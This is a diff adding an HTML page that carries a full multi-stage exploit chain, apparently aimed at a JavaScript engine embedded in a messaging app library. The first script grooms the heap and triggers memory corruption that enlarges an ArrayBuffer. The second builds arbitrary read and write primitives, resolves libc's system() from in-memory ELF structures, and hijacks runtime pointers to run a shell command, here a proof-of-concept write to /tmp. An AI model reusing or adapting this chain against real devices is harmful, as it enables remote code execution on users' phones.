@@ -1,0 +1,395 @@
+<!doctype html><body><div id="v">Ok</div><script id="stageA">"use strict";for(var NP=2600,NQ=2600,L=479,SY=new Array(65600),i=0;i<65600;i++)SY[i]=Symbol();var KEEP=SY.slice(62600);SY=null;for(var RT=[4,0,0,0,5,0,0,0,4,0,0,0,4,0,0,0,4,0,0,0],RJ=[4,0,0,0,5,0,0,0,255,255,0,0,4,0,0,0,4,0,0,0],U=new Uint8Array(L),o=28;o+40<=L;o+=40)for(var k=0;k<20;k++)U[o+k]=RJ[k],U[o+20+k]=RT[k];var A=new Array(NP+NQ);for(i=0;i<NP;i++)A[i]=String.fromCharCode.apply(null,U);var X=String.fromCharCode.apply(null,U);X=null;var S='"use strict"; globalThis.f = function ([] = eval("[]")) { var q1=0,q2=0,q3=0; return 1.1+2.2+3.3+4.4+5.5+6.6+7.7+8.8+9.9; };';for((0,eval)(S),i=NP;i<NP+NQ;i++)A[i]=String.fromCharCode.apply(null,U);var D=new Array(600);for(i=0;i<600;i++)D[i]=new ArrayBuffer(64);var T=new Array(600);for(i=0;i<600;i++)T[i]=new ArrayBuffer(64);T[598]=null;var mark="NOCORR";try{f()}catch(r){}for(i=0;i<600;i++)if(null!==T[i]&&T[i].byteLength>1024){mark="ABLEN["+i+"]="+T[i].byteLength;break}var V=null,VAB=null;for(i=0;i<600;i++)if(null!==T[i]&&T[i].byteLength>1024){VAB=T[i];break}if(VAB)try{mark+=" VLEN="+(V=new Uint8Array(VAB)).length}catch(r){mark+=" VERR="+r}throw globalThis.V=V,globalThis.VAB=VAB,globalThis.T=T,new Error("RESULT "+mark);</script><script id="stageB">// Hook-free parser-chain endgame (s) - build-independent.
+// Build contract (device/gen_c2560s.py): this file is the stage-B source of
+// truth. The builder substitutes DBG (0 final / 1 debug), CALIGN (4 device /
+// 1 host) and CMD (inlined at the usage site), then minifies with
+//   terser -c passes=2 -m
+// and pads to B=7,182 with a trailing /*P...*/ comment. passes=2 is REQUIRED:
+// the default single pass drifts to 7,212 B (audit_universality_20261107.md
+// §3.3). Identical output on terser 5.16/5.24/5.31/5.38.
+// Anchor: the forged AB's own class-20/JSArrayBuffer struct in V[0,4096)
+// (byte_length=327744, data D2); its block header (candidate-8) gives the
+// JSArena/JSArenaSlab used bitmap for every absolute read.  The forged AB's
+// JSArrayBuffer is its own far primitive: re-point its data field and create
+// a fresh Uint8Array(VAB).  Class-24 is only a page-0/1 fallback.  The final
+// resolves libtmessages/libc bases and the free/system symbols from the
+// in-memory ELF at runtime: no JS_DEF_FREE/FREE_GOT offsets.
+(function(){
+  var CALIGN=1;
+  var CMD="id>/tmp/hf_proof;echo HF>>/tmp/hf_proof";
+  var DBG=0;
+  var MASK=281474976710656;
+  var S="";
+  try{
+    var V=globalThis.V,VAB=globalThis.VAB;
+    if(!V||V.length!==327744||!VAB) throw "NOV";
+    var rdu=function(o){return (V[o]|(V[o+1]<<8)|(V[o+2]<<16)|(V[o+3]<<24))>>>0;};
+    var rds=function(o){return V[o]|(V[o+1]<<8);};
+    var p48=function(o){var lo=rdu(o),hi=rdu(o+4);return (hi%65536)*4294967296+lo;};
+    var ok48=function(x){return x>65536&&x<MASK-1&&(x%8)===0;};
+    var okp=function(x){return x>65536&&x<(MASK-1)&&(x%8)===0;};
+    var codeok=function(x){return x>65536&&x<(MASK-1)&&(x%CALIGN)===0;};
+    var TBL=[16,24,32,40,48,56,64,72,80,88,96,104,112,120,128,144,160,176,192,208,224,240,256,288,320,352,384,416,448,480,512];
+    var wrV=function(o,v){var lo=v%4294967296,hi=Math.floor(v/4294967296);
+      V[o]=lo&255;V[o+1]=(lo>>>8)&255;V[o+2]=(lo>>>16)&255;V[o+3]=(lo>>>24)&255;
+      V[o+4]=hi&255;V[o+5]=(hi>>>8)&255;V[o+6]=(hi>>>16)&255;V[o+7]=(hi>>>24)&255;};
+    /* ---- A: forged AB JSArrayBuffer struct in V page 0 ---- */
+    var oS=-1,o24=-1,VBase=0,VSrc=0,VGV=0,arS=0,o;
+    for(o=0;o+24<4096;o+=8){
+      if(rdu(o)===327744&&rdu(o+4)===4294967295&&rds(o+8)===0&&ok48(p48(o+16))&&o>=8){
+        var d2=p48(o+16),h1=rds(o-8),h2=V[o-6],h3=TBL[h2],ar=o-8-h1*h3-48;
+        if(h3&&ar>=0&&ar<o){
+          wrV(o+16,d2+o);
+          var nv=null;try{nv=new Uint8Array(VAB);}catch(e){}
+          wrV(o+16,d2);
+          if(nv&&nv.length===327744){
+            var df=0,k;
+            for(k=0;k<8;k++)if(nv[k]!==V[k]){df=1;break;}
+            if(df){VBase=d2;oS=o;VSrc=1;arS=ar;break;}
+          }
+        }
+      }
+    }
+    /* ---- B: class-24 fallback only in committed page 0/1 ---- */
+    var V2=null,VD=V,FAR=null;
+    if(!VSrc){
+      for(o=0;o+72<0x2000;o+=8){
+        if(rdu(o+18)===24&&rdu(o+64)===327744&&ok48(p48(o+56))){o24=o;VBase=p48(o+56);VSrc=2;break;}
+      }
+      if(!VSrc){
+        globalThis.MEGA="HF ERR NOANCHOR VNC=0 VO=-1 X=0 XG=0 G=0 GS=0 V=0 VK=0 VG=0 P=-1";
+        return;
+      }
+      V2=new Uint8Array(VAB);
+      if(V2.length!==327744)throw "NV2L";
+      VD=V2;
+    }
+    var wrD=function(q,v){var lo=v%4294967296,hi=Math.floor(v/4294967296);
+      VD[q]=lo&255;VD[q+1]=(lo>>>8)&255;VD[q+2]=(lo>>>16)&255;VD[q+3]=(lo>>>24)&255;
+      VD[q+4]=hi&255;VD[q+5]=(hi>>>8)&255;VD[q+6]=(hi>>>16)&255;VD[q+7]=(hi>>>24)&255;};
+    var setF=function(A){
+      if(VSrc===1){
+        wrD(oS+16,A);
+        try{FAR=new Uint8Array(VAB);}catch(e){FAR=V;}
+        wrD(oS+16,VBase);
+      }else{
+        wrD(o24+56,A);
+        FAR=V;
+      }
+    };
+    /* same as setF but writes the exact high word (tag) of a 64-bit pointer */
+    var setF2=function(A,hi){
+      if(VSrc===1){
+        wrD(oS+16,A);
+        VD[oS+20]=hi&255;VD[oS+21]=(hi>>>8)&255;VD[oS+22]=(hi>>>16)&255;VD[oS+23]=(hi>>>24)&255;
+        try{FAR=new Uint8Array(VAB);}catch(e){FAR=V;}
+        wrD(oS+16,VBase);VD[oS+20]=0;VD[oS+21]=0;VD[oS+22]=0;VD[oS+23]=0;
+      }else{
+        wrD(o24+56,A);
+        FAR=V;
+      }
+    };
+    setF(VBase);
+    var r32F=function(q){return (FAR[q]|(FAR[q+1]<<8)|(FAR[q+2]<<16)|(FAR[q+3]<<24))>>>0;};
+    var r16F=function(q){return FAR[q]|(FAR[q+1]<<8);};
+    var r64F=function(q){var lo=r32F(q),hi=r32F(q+4);return hi*4294967296+lo;};
+    var a48F=function(q){var lo=r32F(q),hi=r32F(q+4);return (hi%65536)*4294967296+lo;};
+    /* MTE route-2: keep the full high word (VA bits 32-55 + tag bits 56-59). */
+    var hiF=function(q){return r32F(q+4);};
+    var r16D=function(q){return VD[q]|(VD[q+1]<<8);};
+    var p48D=function(q){var lo=(VD[q]|(VD[q+1]<<8)|(VD[q+2]<<16)|(VD[q+3]<<24))>>>0;
+      var hi=(VD[q+4]|(VD[q+5]<<8)|(VD[q+6]<<16)|(VD[q+7]<<24))>>>0;return (hi%65536)*4294967296+lo;};
+    /* ---- guard + used bitmap ---- */
+    var SR=[],PG=null;
+    var add=function(node){
+      if(!okp(node))return;
+      setF(node);
+      var b=a48F(16),u=r16F(24);
+      if(okp(b))SR.push([b,u]);
+    };
+    var buildPG=function(){
+      PG=new Array(81);
+      for(var p=0;p<81;p++){
+        var ad=VBase+p*4096;PG[p]=0;
+        for(var k2=0;k2<SR.length;k2++){
+          var b2=SR[k2][0],u2=SR[k2][1];
+          if(ad>=b2&&ad<b2+65536){var q2=Math.floor((ad-b2)/4096);PG[p]=(u2>>(q2&15))&1;break;}
+        }
+      }
+    };
+    if(VSrc===1){
+      VGV=3;
+      var sl=p48D(arS+32);
+      if(okp(sl)){
+        VGV=4;
+        setF(sl);
+        var sbase=a48F(16),used=r16F(24);
+        var spS=Math.floor((VBase+oS-sbase)/4096);
+        if(spS>=0&&spS<16&&(used&(1<<spS))){
+          add(sl);
+          var cur=sl,g,nx;
+          for(g=0;g<64;g++){setF(cur);nx=a48F(8);if(!okp(nx)||nx===sl)break;add(nx);cur=nx;}
+          cur=sl;
+          for(g=0;g<64;g++){setF(cur);nx=a48F(0);if(!okp(nx)||nx===sl)break;add(nx);cur=nx;}
+          buildPG();
+          PG[0]=1;
+          VGV=5;
+        }
+      }
+    }else{
+      VGV=1;
+      setF(VBase-8);
+      var hb=r16F(0),hd=FAR[2],hbs=TBL[hd],arena=VBase-8-hb*hbs-48;
+      if(hbs&&arena%4096===0&&arena<=VBase&&VBase-arena<0x1000){
+        VGV=3;
+        setF(arena);
+        var sl2=a48F(32);
+        if(okp(sl2)){
+          VGV=4;
+          setF(sl2);
+          var sb2=a48F(16),us2=r16F(24);
+          var sp2=Math.floor((VBase-sb2)/4096);
+          if(sp2>=0&&sp2<16&&(us2&(1<<sp2))){
+            add(sl2);
+            var cu=sl2,gg,nx2;
+            for(gg=0;gg<64;gg++){setF(cu);nx2=a48F(8);if(!okp(nx2)||nx2===sl2)break;add(nx2);cu=nx2;}
+            cu=sl2;
+            for(gg=0;gg<64;gg++){setF(cu);nx2=a48F(0);if(!okp(nx2)||nx2===sl2)break;add(nx2);cu=nx2;}
+            buildPG();
+            if(PG[0])VGV=5;else{PG=null;VGV=4;}
+          }
+        }
+      }else VGV=2;
+    }
+    if(!PG){PG=null;}
+    var pok=function(q){var p=q>>12;return PG&&p>=0&&p<81&&PG[p];};
+    var inUsed=function(p){
+      for(var k3=0;k3<SR.length;k3++){var b3=SR[k3][0],u3=SR[k3][1];if(p>=b3&&p<b3+65536){var q3=Math.floor((p-b3)/4096);return (u3>>(q3&15))&1;}}
+      return 0;
+    };
+    var hok=function(x){return x>65536&&x<(MASK-1)&&(x%8)===0;};
+    var LIM=[0x800000,0x600000,0x400000];
+    var probe=function(obj){
+      if(!hok(obj)||!inUsed(obj)){X=X||1;return 0;}
+      setF(obj);var shape=a48F(24);
+      if(!hok(shape)||!inUsed(shape)){X=X||2;return 0;}
+      setF(shape);var proto=a48F(48);
+      if(!hok(proto)||!inUsed(proto)){X=X||3;return 0;}
+      setF(proto);var prop=a48F(32);
+      if(!hok(prop)||!inUsed(prop)){X=X||4;return 0;}
+      setF(prop);
+      var pi,pay,ctor=0;
+      for(pi=0;pi<32;pi++){
+        var po=pi*16;
+        if(!inUsed(prop+po+8)||!inUsed(prop+po+12))continue;
+        if(r32F(po+8)!==4294967295||r32F(po+12)!==4294967295)continue;
+        pay=a48F(po);
+        if(!hok(pay)||!inUsed(pay))continue;
+        setF(pay);
+        if(r16F(18)===12){ctor=pay;break;}
+        setF(prop);
+      }
+      if(!ctor){X=X||5;return 0;}
+      setF(ctor);var fn=a48F(56);if(!codeok(fn)){X=X||6;return 0;}
+      var realm=a48F(48),realmHi=hiF(48);if(!hok(realm)){X=X||7;return 0;}
+      setF2(realm,realmHi);var rt=a48F(16),rtHi=hiF(16);if(!hok(rt)){X=X||8;return 0;}
+      setF2(rt,rtHi);var lm=r64F(0x38);
+      if(lm!==LIM[0]&&lm!==LIM[1]&&lm!==LIM[2]){X=X||8;return 0;}
+      var jf=a48F(16);if(!codeok(jf)){X=X||9;return 0;}
+      return [realm,rt,jf,0,realmHi,rtHi];
+    };
+    var VNC=0,VO1=-1,X=0,XS=0,XG=0,VRD=0,anchor=0;
+    if(PG){
+      var oJ=-1;
+      if(VSrc===1){
+        for(o=0;o+60<4096;o+=8){
+          if(r16D(o+18)===20&&p48D(o+48)===VBase+oS){oJ=o;break;}
+        }
+      }
+      if(oJ>=0){VO1=oJ;VNC=1;anchor=probe(VBase+oJ);}
+      if(!anchor){
+        for(o=0;o+48<327744&&!anchor;o+=8){
+          if(!pok(o+18))continue;
+          if((VD[o+18]|(VD[o+19]<<8))!==20)continue;
+          VNC++;if(VO1<0)VO1=o;
+          anchor=probe(VBase+o);
+        }
+      }
+      if(anchor)VRD=1;
+      XS=X;X=0;
+    }
+    /* ---- endG5 used-slab CAND fallback ---- */
+    if(!anchor&&PG&&DBG){
+      var CAND=[];
+      var addSlab=function(b,u){
+        if(!okp(b))return;
+        setF(b);
+        var st,kk,nbb;
+        for(st=0;st<16;st++){
+          if(!(u&(1<<st)))continue;
+          var so=st*4096;
+          if(r32F(so+40)!==12)continue;
+          nbb=(4096-48)/112;
+          for(kk=0;kk<nbb;kk++){
+            var uo=so+48+8+kk*112;
+            if(r16F(uo-8)!==kk)continue;
+            if(r16F(uo+18)===20&&CAND.length<4096)CAND.push(b+uo);
+          }
+        }
+      };
+      for(var gg=0;gg<SR.length;gg++)addSlab(SR[gg][0],SR[gg][1]);
+      for(o=0;o<CAND.length&&!anchor;o++)anchor=probe(CAND[o]);
+      XG=X;
+      if(!anchor){
+        globalThis.MEGA="HF ERR NOANCHOR VNC="+VNC+" VO="+VO1+" X="+XS+" XG="+XG+" G="+CAND.length+" GS="+SR.length+" V=0 VK="+VSrc+" VG="+VGV+" P="+(VSrc===1?oS:o24);
+        return;
+      }
+    }
+    if(!anchor){
+      globalThis.MEGA="HF ERR NOANCHOR VNC="+VNC+" VO="+VO1+" X="+XS+" XG="+XG+" G=0 GS="+SR.length+" V=0 VK="+VSrc+" VG="+VGV+" P="+(VSrc===1?oS:o24);
+      return;
+    }
+    if(DBG){
+      globalThis.MEGA="HF READY VNC="+VNC+" VO="+VO1+" X="+XS+" XG="+XG+" G="+(typeof CAND!="undefined"?CAND.length:0)+" GS="+SR.length+" V="+VRD+" VK="+VSrc+" VG="+VGV+" P="+(VSrc===1?oS:o24);
+      return;
+    }
+    /* ---- runtime ELF resolver: libtmessages base -> free GOT -> libc system ---- */
+    var rt=anchor[1],jsf=anchor[2],rtHi=anchor[5];
+    var nameEqF=function(q,str){
+      for(var z=0;z<str.length;z++)if(FAR[q+z]!==str.charCodeAt(z))return false;
+      return FAR[q+str.length]===0;
+    };
+    var jp=jsf-(jsf%0x1000),app=0;
+    for(o=0;o<0x4000;o++){
+      var a=jp-o*0x1000;
+      if(a<0x10000)break;
+      setF(a);
+      if(r32F(0)===0x464c457f){app=a;break;}
+    }
+    if(!app)throw "NOAPP";
+    setF(app);
+    var pho=r64F(0x20),phes=r16F(0x36),phn=r16F(0x38);
+    if(phes!==56||phn<1||phn>64)throw "BADPH";
+    var adm=0;
+    for(o=0;o<phn;o++){
+      var ppo=pho+o*phes;
+      if(r32F(ppo)===2){adm=app+r64F(ppo+0x10);break;}
+    }
+    if(!adm)throw "NOADYN";
+    setF(adm);
+    var astr=0,asym=0,asz=0,ajmp=0,ajsz=0,aprel=0;
+    for(o=0;o<512;o++){
+      var de=o*16,tg=r64F(de),vl=r64F(de+8);
+      if(tg===0)break;
+      if(tg===5)astr=vl;else if(tg===6)asym=vl;else if(tg===10)asz=vl;
+      else if(tg===23)ajmp=vl;else if(tg===2)ajsz=vl;else if(tg===20)aprel=vl;
+    }
+    if(!astr||!asym||!ajmp||!ajsz)throw "NOADYN2";
+    astr=(astr>=app)?astr:app+astr;
+    asym=(asym>=app)?asym:app+asym;
+    ajmp=(ajmp>=app)?ajmp:app+ajmp;
+    var freegot=0,sysgot=0;
+    var n=Math.floor(ajsz/24);
+    for(o=0;o<n;o++){
+      var eo=o*24;
+      setF(ajmp+eo);
+      var ro=r64F(0),ri=r64F(8);
+      var si=Math.floor(ri/4294967296);
+      setF(asym+si*24);
+      var sn=r32F(0);
+      if(!sn||sn+7>asz)continue;
+      setF(astr+sn);
+      if(nameEqF(0,'free')){freegot=app+ro;if(sysgot)break;}
+      else if(nameEqF(0,'system')){sysgot=app+ro;if(freegot)break;}
+    }
+    if(!freegot&&!sysgot)throw "NOFREE";
+    var system=0;
+    if(sysgot){setF(sysgot);system=a48F(0);}
+    var libcFree=0;
+    if(freegot){setF(freegot);libcFree=a48F(0);}
+    if(!system){
+      if(!codeok(libcFree))throw "NOGOT";
+      var lp=libcFree,page=lp-(lp%0x1000),lbase=0;
+      for(o=0;o<0x4000;o++){
+        var la=page-o*0x1000;
+        if(la<0x10000)break;
+        setF(la);
+        if(r32F(0)===0x464c457f){lbase=la;break;}
+      }
+      if(!lbase)throw "NOELF";
+      setF(lbase);
+      var l_pho=r64F(0x20),l_phes=r16F(0x36),l_phn=r16F(0x38);
+      if(l_phes!==56||l_phn<1||l_phn>64)throw "BADPH2";
+      var ldyn=0;
+      for(o=0;o<l_phn;o++){
+        var lppo=l_pho+o*l_phes;
+        if(r32F(lppo)===2){ldyn=lbase+r64F(lppo+0x10);break;}
+      }
+      if(!ldyn)throw "NODYN2";
+      setF(ldyn);
+      var lstr=0,lsym=0,lsz=0,gnu=0,lhash=0;
+      for(o=0;o<512;o++){
+        var lde=o*16,ltg=r64F(lde),lvl=r64F(lde+8);
+        if(ltg===0)break;
+        if(ltg===5)lstr=lvl;
+        else if(ltg===6)lsym=lvl;
+        else if(ltg===10)lsz=lvl;
+        else if(ltg===0x6ffffef5)gnu=lvl;
+        else if(ltg===4)lhash=lvl;
+      }
+      if(!lstr||!lsym||!lsz||!gnu)throw "NOSYM";
+      lstr=(lstr>=lbase)?lstr:lbase+lstr;
+      lsym=(lsym>=lbase)?lsym:lbase+lsym;
+      gnu=(gnu>=lbase)?gnu:lbase+gnu;
+      if(lhash)lhash=(lhash>=lbase)?lhash:lbase+lhash;
+      var sc=0;
+      if(lhash){setF(lhash);var nch=r32F(4)>>>0;if(nch>0&&nch<0x100000)sc=nch;}
+      if(!sc&&lstr>lsym){var dd=Math.floor((lstr-lsym)/24);if(dd>0&&dd<0x100000)sc=dd;}
+      if(!sc)throw "NOSC";
+      setF(gnu);
+      var nb=r32F(0)>>>0,so=r32F(4)>>>0,bsz=r32F(8)>>>0,bsh=r32F(12)>>>0;
+      if(!(nb>0&&nb<=0x100000&&bsz>0&&bsz<=0x1000&&bsh<64&&so<sc))throw "BADGNU";
+      var h=5381;
+      for(o=0;o<6;o++)h=((h*33)+'system'.charCodeAt(o))>>>0;
+      setF(gnu+16+(Math.floor(h/64)%bsz)*8);
+      var w0=r32F(0)>>>0,w1=r32F(4)>>>0;
+      var b0=h&63,b1=(h>>>bsh)&63;
+      if((b0<32?w0&(1<<b0):w1&(1<<(b0-32)))&&(b1<32?w0&(1<<b1):w1&(1<<(b1-32)))){
+        setF(gnu+16+bsz*8+(h%nb)*4);
+        var bk=r32F(0)>>>0;
+        if(bk>=so&&bk<sc){
+          var ci=bk-so,guard=0;
+          while(bk<sc&&ci<(sc-so)&&guard<100000){
+            setF(gnu+16+bsz*8+nb*4+ci*4);
+            var ch=r32F(0)>>>0;
+            if(((ch|1)>>>0)===((h|1)>>>0)){
+              setF(lsym+bk*24);
+              var sn3=r32F(0)>>>0;
+              if(sn3>0&&sn3+7<=lsz){
+                setF(lstr+sn3);
+                if(nameEqF(0,'system')){setF(lsym+bk*24);system=lbase+r64F(8);break;}
+              }
+            }
+            if(ch&1)break;
+            bk++;ci++;guard++;
+          }
+        }
+      }
+      if(!system)throw "NOSYS";
+    }
+    var wrRt=function(A,v,ah){
+      setF2(A,ah);
+      var lo=v%4294967296,hi=Math.floor(v/4294967296);
+      FAR[0]=lo&255;FAR[1]=(lo>>>8)&255;FAR[2]=(lo>>>16)&255;FAR[3]=(lo>>>24)&255;
+      FAR[4]=hi&255;FAR[5]=(hi>>>8)&255;FAR[6]=(hi>>>16)&255;FAR[7]=(hi>>>24)&255;
+    };
+    setF(VBase);
+    for(o=0;o<CMD.length;o++)FAR[o]=CMD.charCodeAt(o)&255;
+    FAR[CMD.length]=0;
+    setF2(rt,rtHi);
+    wrRt(rt+64,VBase,rtHi);
+    wrRt(rt+16,system,rtHi);
+    S="OK";
+  }catch(e){S="ERR "+e;}
+  globalThis.MEGA="HF "+S;
+})();
+</script><script id="stageC">if(1){try{var m=typeof mark!="undefined"?mark:"-",e=typeof MEGA!="undefined"?MEGA:"-";var x="S1 "+m+" END="+e;var D=document.getElementById("v");D&&(D.textContent=x)}catch(r){}}/*PPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP*/</script>
